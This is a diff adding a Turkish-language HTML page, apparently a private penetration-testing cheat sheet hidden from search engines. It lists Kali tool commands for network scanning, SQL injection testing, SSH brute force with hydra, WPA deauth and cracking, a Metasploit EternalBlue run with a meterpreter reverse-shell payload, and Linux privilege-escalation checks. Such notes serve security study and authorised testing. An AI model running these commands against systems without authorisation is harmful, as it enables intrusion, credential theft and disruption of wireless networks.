@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CyberTools – Kişisel Siber Güvenlik Notları</title>
+  <link rel="stylesheet" href="css/style.css" />
+  <meta name="robots" content="noindex, nofollow"> <!-- Google’dan gizli -->
+</head>
+<body>
+
+  <section class="gray-box" style="margin-top: 100px;">
+    <h2 class="neon-text">CyberTools – Kişisel Siber Güvenlik Ajandası</h2>
+    <p>Bu sayfa yalnızca sana özeldir dostum. Tüm sızma test araçları, Kali Linux komutları ve kendi not kutun bu sayfada yer alır.</p>
+
+    <hr>
+    <h3>1. Ağ Keşif ve Bilgi Toplama</h3>
+    <ul>
+      <li><strong>ifconfig</strong> – IP adresi ve ağ arabirimlerini gösterir<br><code>ifconfig</code></li>
+      <li><strong>netdiscover</strong> – Ağdaki cihazları keşfeder<br><code>netdiscover -r 192.168.1.0/24</code></li>
+      <li><strong>whois</strong>, <strong>dig</strong>, <strong>nslookup</strong> – DNS ve domain bilgi toplama</li>
+    </ul>
+
+    <hr>
+    <h3>2. Port Tarama & Servis Keşfi</h3>
+    <ul>
+      <li><strong>nmap</strong> – Port tarama<br><code>nmap -sS -T4 192.168.1.1</code></li>
+      <li><strong>masscan</strong> – Hızlı port tarama<br><code>masscan 192.168.1.0/24 -p80</code></li>
+    </ul>
+
+    <hr>
+    <h3>3. Web Uygulama Test Araçları</h3>
+    <ul>
+      <li><strong>sqlmap</strong> – SQL Injection testi<br><code>sqlmap -u "http://site.com/page.php?id=1" --dbs</code></li>
+      <li><strong>gobuster</strong> – Dizin brute-force<br><code>gobuster dir -u http://site.com -w /wordlist.txt</code></li>
+      <li><strong>nikto</strong> – Web sunucusu zafiyet tarayıcı</li>
+    </ul>
+
+    <hr>
+    <h3>4. Şifre Kırma ve Erişim Testi</h3>
+    <ul>
+      <li><strong>hydra</strong> – SSH brute-force<br><code>hydra -l admin -P rockyou.txt 192.168.1.1 ssh</code></li>
+      <li><strong>john the ripper</strong> – Hash kırma<br><code>john --wordlist=rockyou.txt hashes.txt</code></li>
+    </ul>
+
+    <hr>
+    <h3>5. Kablosuz Ağ Saldırıları</h3>
+    <ul>
+      <li><strong>airmon-ng</strong> – Monitor moda geç<br><code>airmon-ng start wlan0</code></li>
+      <li><strong>airodump-ng</strong> – Ağları keşfet<br><code>airodump-ng wlan0mon</code></li>
+      <li><strong>aireplay-ng</strong> – Deauth saldırısı<br><code>aireplay-ng -0 10 -a [BSSID] wlan0mon</code></li>
+      <li><strong>aircrack-ng</strong> – WPA handshake kır<br><code>aircrack-ng -w rockyou.txt dump.cap</code></li>
+    </ul>
+
+    <hr>
+    <h3>6. Metasploit Kullanımı</h3>
+    <ul>
+      <li><code>msfconsole</code> – Başlat</li>
+      <li><code>use exploit/windows/smb/ms17_010_eternalblue</code> – Exploit seç</li>
+      <li><code>set RHOSTS 192.168.1.10</code> – Hedef belirle</li>
+      <li><code>set PAYLOAD windows/meterpreter/reverse_tcp</code> – Payload seç</li>
+      <li><code>set LHOST 192.168.1.5</code> – Saldırgan IP</li>
+      <li><code>exploit</code> – Çalıştır</li>
+    </ul>
+
+    <hr>
+    <h3>7. Exploit Veritabanı</h3>
+    <ul>
+      <li><code>searchsploit wordpress</code> – Exploit araması</li>
+      <li><code>searchsploit -x path/to/exploit</code> – Detay görüntüle</li>
+      <li><code>searchsploit -u</code> – Güncelle</li>
+    </ul>
+
+    <hr>
+    <h3>8. Privilege Escalation (Linux)</h3>
+    <ul>
+      <li><code>sudo -l</code> – Sudo izinlerini göster</li>
+      <li><code>find / -perm -4000 2>/dev/null</code> – SUID dosyaları</li>
+      <li><code>uname -a</code> + <code>searchsploit kernel</code> – Kernel exploit kontrolü</li>
+      <li><code>./linpeas.sh</code> – Otomatik privesc aracı</li>
+    </ul>
+
+    <hr>
+    <h3>9. Kendi Notlarım</h3>
+    <textarea rows="10" placeholder="Buraya kendi hedef IP'lerini, özel komutlarını, notlarını yazabilirsin..." style="width: 100%; border-radius: 8px; padding: 10px; background-color: rgba(255,255,255,0.05); color: #e0e0e0; border: none;"></textarea>
+
+    <p style="margin-top: 20px; font-style: italic;">Bu sayfa sana özeldir. Menüde görünmez, arama motorları tarafından indekslenmez. Lütfen bağlantısını paylaşma.</p>
+  </section>
+
+</body>
+</html>
